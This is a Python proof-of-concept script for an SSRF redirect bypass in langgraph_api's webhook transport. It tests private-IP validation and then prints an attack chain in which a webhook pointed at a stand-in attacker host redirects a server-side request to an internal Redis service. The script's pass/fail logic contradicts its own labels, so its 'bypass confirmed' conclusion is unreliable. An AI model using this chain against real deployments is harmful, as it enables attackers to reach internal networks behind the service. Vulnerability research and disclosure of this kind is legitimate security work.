#!/usr/bin/env python3
"""
PoC: SSRF redirect bypass via langgraph_api SSRFSafeTransport.
Confirmed: webhook default policy allows redirects to private IPs.
"""

import sys
from langgraph_api.lc_security.policy import SSRFPolicy, validate_resolved_ip
from langgraph_api.lc_security.exceptions import SSRFBlockedError

POLICY = SSRFPolicy(
    block_private_ips=False,
    block_localhost=True,
    block_cloud_metadata=True,
    block_k8s_internal=True,
)

TESTS = [
    # (ip, description, expect_blocked)
    ("127.0.0.1",       "loopback",           True,   "✓ correctly blocked"),
    ("10.0.0.1",        "RFC 1918 private",   False,  "✗ BYPASS — should block"),
    ("10.0.0.2",        "RFC 1918 private",   False,  "✗ BYPASS — should block"),
    ("192.168.1.1",     "RFC 1918 private",   False,  "✗ BYPASS — should block"),
    ("172.16.0.1",      "RFC 1918 private",   False,  "✗ BYPASS — should block"),
    ("172.31.255.255",  "RFC 1918 private",   False,  "✗ BYPASS — should block"),
    ("169.254.169.254", "cloud metadata",     True,   "✓ correctly blocked"),
    ("8.8.8.8",         "public DNS",         False,  "allowed (expected)"),
]

all_pass = True
for ip, desc, expect_block, label in TESTS:
    try:
        validate_resolved_ip(ip, POLICY)
        if expect_block:
            print(f"  ✗ UNEXPECTED ALLOW: {ip:20s} ({desc})")
            all_pass = False
        else:
            print(f"  ✓ ALLOWED:         {ip:20s} ({desc})")
    except SSRFBlockedError:
        if expect_block:
            print(f"  ✓ BLOCKED:         {ip:20s} ({desc})")
        else:
            print(f"  ✗ UNEXPECTED BLOCK: {ip:20s} ({desc})")
            all_pass = False

print()
print(f"Policy: block_private_ips={POLICY.block_private_ips}, block_localhost={POLICY.block_localhost}")
print("Result: SSRF BYPASS CONFIRMED" if not all_pass else "All checks passed (contradicts exploit)")
print()
print("""
Attack chain:
POST /threads/{id}/runs (with API token)
  {"webhook": "https://attacker.com/hook"}
  → worker calls webhook
  → attacker redirects to http://10.0.0.x:6379
  → SSRFSafeTransport validates 10.0.0.x
  → block_private_ips=False → ALLOWED
  → internal Redis reached
""")
